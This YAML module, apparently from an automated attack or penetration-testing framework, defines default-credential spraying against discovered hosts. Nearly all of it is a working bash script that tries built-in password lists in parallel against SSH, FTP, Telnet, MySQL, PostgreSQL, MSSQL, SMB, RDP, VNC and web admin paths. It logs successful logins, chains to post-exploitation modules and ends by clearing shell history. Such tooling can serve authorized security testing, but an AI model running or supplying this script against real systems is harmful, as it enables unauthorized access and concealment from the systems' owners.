id: default_credential_testing
name: Default Credential Testing
category: Initial Access
priority: critical
description: Test common default credentials across all discovered services in batch
detailed_description: |
  Systematically test default and common credentials against all discovered services.
  This methodology adapts to each service type and uses service-specific credential lists
  and authentication methods. Supports batch testing for efficiency.

# Asset property-based triggers
asset_triggers:
  # Trigger for individual services with known default credentials
  - asset_type: service
    conditions:
      all:
        - property: state
          operator: equals
          value: "open"
        - property: auth_required
          operator: equals
          value: true
        - property: default_creds_tested
          operator: not_equals
          value: true
        - property: port
          operator: in_list
          values: [21, 22, 23, 80, 443, 445, 1433, 3306, 3389, 5432, 5900, 8080, 8161, 8983]
    priority: 90
    deduplication_key: "{asset.id}:default_creds"
    batch_capable: true
    batch_criteria: service_category
    max_batch_size: 100

  # Trigger for hosts with multiple services
  - asset_type: host
    conditions:
      all:
        - property: service_count
          operator: greater_than
          value: 2
        - property: default_creds_tested
          operator: not_equals
          value: true
    priority: 85
    deduplication_key: "{asset.id}:host_default_creds:{service_count}"
    batch_capable: true

# Variable extraction
variables:
  service_type:
    source: service_name
    transform: "service_name.toLowerCase()"

  service_port:
    source: port

  target_host:
    source: host_id
    transform: "getHostProperty(host_id, 'ip_address')"

  protocol:
    source: protocol

  all_services:
    source: discovered_services
    default: []

  ssh_hosts:
    source: discovered_services
    transform: "discovered_services.where(s => s.service == 'ssh').map(s => s.host)"

  web_services:
    source: discovered_services
    transform: "discovered_services.where(s => ['http', 'https'].contains(s.service))"

  database_services:
    source: discovered_services
    transform: "discovered_services.where(s => ['mysql', 'mssql', 'postgres', 'oracle'].contains(s.service))"

  output_file:
    value: "/tmp/default_creds_{asset.id}_{timestamp}.txt"

  success_file:
    value: "/tmp/cred_success_{asset.id}_{timestamp}.txt"

# Batch command for testing multiple services
batch_command: |
  #!/bin/bash
  OUTPUT="{output_file}"
  SUCCESS="{success_file}"

  echo "[*] Starting default credential testing at $(date)" | tee "$OUTPUT"

  # Function to test SSH credentials
  test_ssh_creds() {
    local host=$1
    local user=$2
    local pass=$3

    timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
      "$user@$host" "echo 'SSH_SUCCESS'" 2>/dev/null | grep -q "SSH_SUCCESS" && \
      echo "SUCCESS: SSH $host $user:$pass" | tee -a "$SUCCESS"
  }

  # Function to test FTP credentials
  test_ftp_creds() {
    local host=$1
    local user=$2
    local pass=$3

    echo -e "USER $user\nPASS $pass\nQUIT" | timeout 10 nc -w 3 "$host" 21 2>/dev/null | \
      grep -q "230" && echo "SUCCESS: FTP $host $user:$pass" | tee -a "$SUCCESS"
  }

  # Function to test Telnet credentials
  test_telnet_creds() {
    local host=$1
    local user=$2
    local pass=$3

    expect -c "
      set timeout 10
      spawn telnet $host
      expect \"login:\" { send \"$user\r\" }
      expect \"Password:\" { send \"$pass\r\" }
      expect \"#\" { puts \"SUCCESS: TELNET $host $user:$pass\"; exit 0 }
      expect \"$\" { puts \"SUCCESS: TELNET $host $user:$pass\"; exit 0 }
      expect timeout { exit 1 }
    " 2>/dev/null && echo "SUCCESS: TELNET $host $user:$pass" | tee -a "$SUCCESS"
  }

  # Function to test MySQL credentials
  test_mysql_creds() {
    local host=$1
    local user=$2
    local pass=$3

    timeout 10 mysql -h "$host" -u "$user" -p"$pass" -e "SELECT 1;" 2>/dev/null && \
      echo "SUCCESS: MySQL $host $user:$pass" | tee -a "$SUCCESS"
  }

  # Function to test PostgreSQL credentials
  test_postgres_creds() {
    local host=$1
    local user=$2
    local pass=$3

    PGPASSWORD="$pass" timeout 10 psql -h "$host" -U "$user" -d postgres -c "SELECT 1;" 2>/dev/null && \
      echo "SUCCESS: PostgreSQL $host $user:$pass" | tee -a "$SUCCESS"
  }

  # Function to test MSSQL credentials
  test_mssql_creds() {
    local host=$1
    local user=$2
    local pass=$3

    timeout 10 sqlcmd -S "$host" -U "$user" -P "$pass" -Q "SELECT 1;" 2>/dev/null && \
      echo "SUCCESS: MSSQL $host $user:$pass" | tee -a "$SUCCESS"
  }

  # Function to test SMB credentials
  test_smb_creds() {
    local host=$1
    local user=$2
    local pass=$3

    timeout 10 smbclient -L "//$host" -U "$user%$pass" -N 2>/dev/null | \
      grep -q "Sharename" && echo "SUCCESS: SMB $host $user:$pass" | tee -a "$SUCCESS"
  }

  # Function to test RDP credentials
  test_rdp_creds() {
    local host=$1
    local user=$2
    local pass=$3

    timeout 10 xfreerdp /v:"$host" /u:"$user" /p:"$pass" /cert-ignore +auth-only 2>/dev/null | \
      grep -q "Authentication only" && echo "SUCCESS: RDP $host $user:$pass" | tee -a "$SUCCESS"
  }

  # Function to test VNC passwords
  test_vnc_creds() {
    local host=$1
    local pass=$2

    if [ -z "$pass" ]; then
      # Test for no password
      timeout 5 vncviewer -autopass "$host:5900" 2>/dev/null && \
        echo "SUCCESS: VNC $host (no password)" | tee -a "$SUCCESS"
    else
      # Create temporary password file
      echo "$pass" > /tmp/vnc_pass_$$
      timeout 5 vncviewer -passwd /tmp/vnc_pass_$$ "$host:5900" 2>/dev/null && \
        echo "SUCCESS: VNC $host password:$pass" | tee -a "$SUCCESS"
      rm -f /tmp/vnc_pass_$$
    fi
  }

  # Function to test HTTP basic auth
  test_http_creds() {
    local url=$1
    local user=$2
    local pass=$3

    timeout 10 curl -s -u "$user:$pass" "$url" -w "%{http_code}" | \
      grep -qE "^(200|30[0-9])" && echo "SUCCESS: HTTP $url $user:$pass" | tee -a "$SUCCESS"
  }

  # SSH default credential testing
  if [ -n "{ssh_hosts}" ]; then
    echo "[+] Testing SSH default credentials..." | tee -a "$OUTPUT"
    for host in {ssh_hosts}; do
      echo "  [*] Testing SSH on $host" | tee -a "$OUTPUT"

      # Common SSH credentials
      declare -a ssh_creds=(
        "root:root"
        "root:toor"
        "root:password"
        "root:admin"
        "admin:admin"
        "admin:password"
        "admin:123456"
        "pi:raspberry"
        "ubuntu:ubuntu"
        "user:user"
        "guest:guest"
        "test:test"
        "oracle:oracle"
        "postgres:postgres"
        "mysql:mysql"
        "nagios:nagios"
        "zabbix:zabbix"
        "tomcat:tomcat"
        "jenkins:jenkins"
        "cisco:cisco"
        "admin:"
        "root:"
      )

      for cred in "${ssh_creds[@]}"; do
        user=$(echo "$cred" | cut -d: -f1)
        pass=$(echo "$cred" | cut -d: -f2)
        test_ssh_creds "$host" "$user" "$pass" &
        # Limit concurrent connections
        (($(jobs -r | wc -l) >= 10)) && wait
      done
      wait
    done
  fi

  # Database credential testing
  echo "[+] Testing database default credentials..." | tee -a "$OUTPUT"

  # MySQL/MariaDB (3306)
  for service in {database_services}; do
    if [[ "$service" == *"mysql"* ]]; then
      host=$(echo "$service" | jq -r '.host')
      echo "  [*] Testing MySQL on $host" | tee -a "$OUTPUT"

      declare -a mysql_creds=(
        "root:"
        "root:root"
        "root:toor"
        "root:password"
        "root:Password123"
        "mysql:mysql"
        "admin:admin"
        "admin:password"
        "user:user"
        "test:test"
      )

      for cred in "${mysql_creds[@]}"; do
        user=$(echo "$cred" | cut -d: -f1)
        pass=$(echo "$cred" | cut -d: -f2)
        test_mysql_creds "$host" "$user" "$pass" &
        (($(jobs -r | wc -l) >= 5)) && wait
      done
      wait
    fi

    # PostgreSQL (5432)
    if [[ "$service" == *"postgres"* ]]; then
      host=$(echo "$service" | jq -r '.host')
      echo "  [*] Testing PostgreSQL on $host" | tee -a "$OUTPUT"

      declare -a postgres_creds=(
        "postgres:postgres"
        "postgres:password"
        "postgres:admin"
        "postgres:"
        "admin:admin"
        "user:user"
      )

      for cred in "${postgres_creds[@]}"; do
        user=$(echo "$cred" | cut -d: -f1)
        pass=$(echo "$cred" | cut -d: -f2)
        test_postgres_creds "$host" "$user" "$pass" &
        (($(jobs -r | wc -l) >= 5)) && wait
      done
      wait
    fi

    # MSSQL (1433)
    if [[ "$service" == *"mssql"* ]]; then
      host=$(echo "$service" | jq -r '.host')
      echo "  [*] Testing MSSQL on $host" | tee -a "$OUTPUT"

      declare -a mssql_creds=(
        "sa:"
        "sa:sa"
        "sa:password"
        "sa:Password123"
        "sa:SQLPassword"
        "admin:admin"
        "administrator:password"
      )

      for cred in "${mssql_creds[@]}"; do
        user=$(echo "$cred" | cut -d: -f1)
        pass=$(echo "$cred" | cut -d: -f2)
        test_mssql_creds "$host" "$user" "$pass" &
        (($(jobs -r | wc -l) >= 5)) && wait
      done
      wait
    fi
  done

  # SMB credential testing (445/139)
  echo "[+] Testing SMB default credentials..." | tee -a "$OUTPUT"
  for host in $(echo '{all_services}' | jq -r '.[] | select(.service == "smb") | .host'); do
    echo "  [*] Testing SMB on $host" | tee -a "$OUTPUT"

    declare -a smb_creds=(
      "administrator:"
      "administrator:password"
      "administrator:admin"
      "admin:admin"
      "admin:password"
      "admin:123456"
      "guest:"
      "user:user"
      "test:test"
    )

    for cred in "${smb_creds[@]}"; do
      user=$(echo "$cred" | cut -d: -f1)
      pass=$(echo "$cred" | cut -d: -f2)
      test_smb_creds "$host" "$user" "$pass" &
      (($(jobs -r | wc -l) >= 10)) && wait
    done
    wait
  done

  # RDP credential testing (3389)
  echo "[+] Testing RDP default credentials..." | tee -a "$OUTPUT"
  for host in $(echo '{all_services}' | jq -r '.[] | select(.service == "rdp") | .host'); do
    echo "  [*] Testing RDP on $host" | tee -a "$OUTPUT"

    declare -a rdp_creds=(
      "Administrator:"
      "Administrator:password"
      "Administrator:admin"
      "Administrator:123456"
      "admin:admin"
      "admin:password"
      "user:user"
      "guest:guest"
    )

    for cred in "${rdp_creds[@]}"; do
      user=$(echo "$cred" | cut -d: -f1)
      pass=$(echo "$cred" | cut -d: -f2)
      test_rdp_creds "$host" "$user" "$pass" &
      (($(jobs -r | wc -l) >= 5)) && wait
    done
    wait
  done

  # VNC password testing (5900)
  echo "[+] Testing VNC default passwords..." | tee -a "$OUTPUT"
  for host in $(echo '{all_services}' | jq -r '.[] | select(.service == "vnc") | .host'); do
    echo "  [*] Testing VNC on $host" | tee -a "$OUTPUT"

    declare -a vnc_passwords=(
      ""
      "password"
      "vnc"
      "admin"
      "1234"
      "default"
      "123456"
    )

    for pass in "${vnc_passwords[@]}"; do
      test_vnc_creds "$host" "$pass" &
      (($(jobs -r | wc -l) >= 5)) && wait
    done
    wait
  done

  # Web service credential testing
  echo "[+] Testing web service default credentials..." | tee -a "$OUTPUT"
  for service in {web_services}; do
    host=$(echo "$service" | jq -r '.host')
    port=$(echo "$service" | jq -r '.port')
    ssl=$(echo "$service" | jq -r '.ssl // false')

    if [ "$ssl" = "true" ]; then
      url="https://$host:$port"
    else
      url="http://$host:$port"
    fi

    echo "  [*] Testing web service on $url" | tee -a "$OUTPUT"

    # Common web application paths
    declare -a web_paths=(
      "/admin"
      "/manager/html"
      "/console"
      "/login"
      "/administration"
      "/admin/admin"
    )

    declare -a web_creds=(
      "admin:admin"
      "admin:password"
      "admin:123456"
      "admin:"
      "administrator:password"
      "root:root"
      "tomcat:tomcat"
      "manager:manager"
      "nagiosadmin:nagios"
      "guest:guest"
    )

    for path in "${web_paths[@]}"; do
      for cred in "${web_creds[@]}"; do
        user=$(echo "$cred" | cut -d: -f1)
        pass=$(echo "$cred" | cut -d: -f2)
        test_http_creds "$url$path" "$user" "$pass" &
        (($(jobs -r | wc -l) >= 10)) && wait
      done
    done
    wait
  done

  # Cleanup background jobs
  wait

  echo "[*] Default credential testing completed at $(date)" | tee -a "$OUTPUT"
  echo "[*] Successful authentications:" | tee -a "$OUTPUT"
  if [ -f "$SUCCESS" ]; then
    cat "$SUCCESS" | tee -a "$OUTPUT"
    echo "[*] Total successful logins: $(wc -l < "$SUCCESS")" | tee -a "$OUTPUT"
  else
    echo "[!] No successful default credentials found" | tee -a "$OUTPUT"
  fi

# Individual command for single service
individual_command: |
  #!/bin/bash
  SERVICE="{service_type}"
  HOST="{target_host}"
  PORT="{service_port}"
  OUTPUT="{output_file}"

  echo "[*] Testing default credentials for $SERVICE on $HOST:$PORT" | tee "$OUTPUT"

  case "$SERVICE" in
    ssh)
      echo "[+] Testing SSH credentials..."
      sshpass -p "admin" ssh -o StrictHostKeyChecking=no admin@"$HOST" "exit" 2>/dev/null && \
        echo "SUCCESS: SSH $HOST admin:admin" | tee -a "$OUTPUT"
      ;;

    mysql)
      echo "[+] Testing MySQL credentials..."
      mysql -h "$HOST" -u root -p"" -e "SELECT 1;" 2>/dev/null && \
        echo "SUCCESS: MySQL $HOST root:(blank)" | tee -a "$OUTPUT"
      ;;

    ftp)
      echo "[+] Testing FTP credentials..."
      echo -e "USER anonymous\nPASS anonymous\nQUIT" | nc -w 3 "$HOST" 21 | \
        grep -q "230" && echo "SUCCESS: FTP $HOST anonymous:anonymous" | tee -a "$OUTPUT"
      ;;

    *)
      echo "[!] No specific test for service: $SERVICE"
      ;;
  esac

# Expected property updates
property_updates:
  on_success:
    - property: default_creds_tested
      operation: set
      value: true

    - property: valid_default_creds
      operation: set
      value: "{found_credentials}"

    - property: default_cred_count
      operation: set
      value: "{credential_count}"

    - property: tested_timestamp
      operation: set
      value: "{timestamp}"

  on_failure:
    - property: default_creds_tested
      operation: set
      value: true

    - property: default_cred_test_failed
      operation: set
      value: true

# Expected discoveries
expected_discoveries:
  - asset_type: credential
    conditions:
      - validation: "success"
    properties:
      username: "{username}"
      password: "{password}"
      service: "{service_type}"
      host: "{target_host}"
      port: "{service_port}"
      source: "default_credential_testing"
      confirmed: true

# Chain triggers
chain_triggers:
  on_success:
    - condition:
        property: valid_default_creds
        operator: exists
      trigger: authenticated_service_enumeration

    - condition:
        property: valid_default_creds
        operator: contains
        match:
          service: "ssh"
      trigger: ssh_post_exploitation

    - condition:
        property: valid_default_creds
        operator: contains
        match:
          service: "smb"
      trigger: smb_post_exploitation

    - condition:
        property: valid_default_creds
        operator: contains
        match:
          category: "database"
      trigger: database_enumeration

# Outcome analysis
outcome_analysis:
  success_indicators:
    - Valid credentials found
    - Services authenticated
    - Access gained to systems
    - Multiple services compromised

  failure_indicators:
    - No default credentials valid
    - All services hardened
    - Account lockouts triggered
    - Connection timeouts

  metrics:
    - services_tested: "{services_tested_count}"
    - credentials_tested: "{total_credentials_tested}"
    - successful_logins: "{successful_count}"
    - success_rate: "{success_percentage}"

# Cleanup
cleanup:
  - priority: high
    action: Clear credential files
    command: |
      shred -u {output_file} {success_file} 2>/dev/null
      rm -f /tmp/vnc_pass_*

  - priority: medium
    action: Clear authentication logs
    command: |
      # Clear any cached credentials
      unset PGPASSWORD
      history -c